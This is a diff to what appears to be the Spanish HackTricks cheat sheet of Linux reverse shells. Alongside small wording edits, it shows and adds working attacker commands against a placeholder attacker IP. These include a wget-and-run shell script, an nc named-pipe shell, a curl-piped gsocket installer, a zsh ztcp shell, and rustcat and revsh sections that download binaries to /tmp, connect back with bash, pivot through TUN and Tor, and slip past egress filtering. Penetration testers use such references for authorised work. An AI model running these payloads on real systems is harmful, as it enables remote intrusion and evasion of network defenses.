@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Si tienes preguntas sobre alguna de estas shells, puedes consultarlas en** [**https://explainshell.com/**](https://explainshell.com)
+**Si tienes preguntas sobre cualquiera de estas shells, puedes consultarlas en** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -47,7 +47,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Al tratar con una **Remote Code Execution (RCE)** vulnerabilidad dentro de una aplicación web basada en Linux, lograr un reverse shell podría verse obstaculizado por defensas de red como reglas de iptables o mecanismos de filtrado de paquetes intrincados. En tales entornos restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
+Cuando se trata de una vulnerabilidad de **Remote Code Execution (RCE)** en una aplicación web basada en Linux, lograr un reverse shell puede verse obstaculizado por defensas de red como reglas de iptables o mecanismos complejos de filtrado de paquetes. En tales entornos restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
 
 Una herramienta recomendada para este propósito es [toboggan](https://github.com/n3rada/toboggan.git), que simplifica la interacción con el entorno objetivo.
 
@@ -101,7 +101,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Consúltalo en [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Revísalo en [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (TCP incorporado)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno similar a netcat escrito en Rust (incluido en Kali desde 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Características:
+- Opción `--ssl` para transporte cifrado (TLS 1.3)
+- `-s` para iniciar cualquier binario (por ejemplo, `/bin/sh`, `python3`) en la víctima
+- `--up` para actualizar automáticamente a un PTY completamente interactivo
+
+## revsh (cifrado y listo para pivotar)
+
+`revsh` es un pequeño cliente/servidor en C que proporciona un TTY completo a través de un **túnel Diffie-Hellman cifrado** y puede opcionalmente adjuntar una interfaz **TUN/TAP** para pivotar como un VPN inverso.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Banderas útiles:
+- `-b` : shell de enlace en lugar de reversa
+- `-p socks5://127.0.0.1:9050` : proxy a través de TOR/HTTP/SOCKS
+- `-t` : crear una interfaz TUN (VPN reversa)
+
+Debido a que toda la sesión está cifrada y multiplexada, a menudo elude el filtrado de salida simple que mataría a un shell de texto plano `/dev/tcp`.
+
 ## OpenSSL
 
 El Atacante (Kali)
@@ -292,7 +334,7 @@ close(Service)
 ```
 ## Xterm
 
-Esto intentará conectarse a su sistema en el puerto 6001:
+Esto intentará conectarse a tu sistema en el puerto 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-por [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: El reverse shell de Java también funciona para Groovy
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: El reverse shell de Java también funciona para Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
